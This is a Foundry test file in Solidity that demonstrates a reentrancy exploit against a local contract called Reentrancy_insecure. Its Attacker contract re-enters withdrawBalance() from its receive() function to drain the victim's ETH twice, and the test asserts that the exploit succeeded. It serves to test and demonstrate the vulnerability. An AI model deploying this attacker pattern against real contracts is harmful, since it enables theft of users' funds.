
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {Reentrancy_insecure} from "../src/Reentrancy_insecure.sol";

contract TestReentrancyReentrancy_insecure is Test {
    using stdStorage for StdStorage;

    Reentrancy_insecure public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 4);

        // --- 2. State Configuration (Pre-Condition) ---
        // Set the attacker's balance in the victim contract's userBalances mapping
        // userBalances is at slot 0, and we need to set userBalances[attacker] = attackVal
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    Reentrancy_insecure public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        // Capture Initial State - balance of attacker before the attack
        initialSnapshot = address(this).balance;
        
        // Store the value for the re-entrant call
        storedAttackVal = val;

        // Call the vulnerable function
        victim.withdrawBalance();

        // Verify Success Conditions
        // If we received more than the initial deposit (val), the reentrancy worked
        // We should have received val * 2 (once from initial call, once from reentrant call)
        if (address(this).balance >= initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the vulnerable function
            victim.withdrawBalance();
        }
    }

    fallback() external payable {}
}
